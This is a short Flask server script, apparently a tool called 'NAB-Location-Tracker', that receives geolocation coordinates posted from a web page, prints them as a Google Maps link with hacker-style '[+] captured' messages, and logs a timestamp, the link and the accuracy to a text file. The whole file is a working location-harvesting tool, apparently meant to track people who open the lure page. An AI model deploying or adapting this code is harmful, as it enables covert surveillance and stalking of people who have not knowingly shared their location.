from flask import Flask, render_template, request, jsonify,redirect,url_for
import datetime 


done=False

app = Flask(__name__)


@app.route('/')
def index():
    print("[+]NAB-Location-Tracker Active")
    return render_template('index.html')


@app.route('/post', methods=['POST',"GET"])
def say_name():
    data=request.form.get("txt1")
    try:
        data=data.split(":")
    except:
        return render_template('index.html')
    
    try:
        print("Logging to user.txt for more reference..")
        print("[+]Capture Details.")
        link="https://www.google.com/maps/@"+data[0]+","+data[1]+",21z"
        print(link)
        print("Accuracy: ",data[2])
        print("[+]Location successfully captured!")
        current_time = datetime.datetime.now() 
        global done
        if not done:

            with open('user.txt','a') as f:
                f.write(str('\n')+str("|")+str(current_time)+str("|")+str(link)+str("|")+str(data[2]))
            
            done=True


        return render_template('index.html')
        
    except Exception as e:
        print(e)
        print("[-]Error: I guess,Location Access Denied!")
        return render_template("index.html")


if __name__ == '__main__':
    app.run(debug=True)
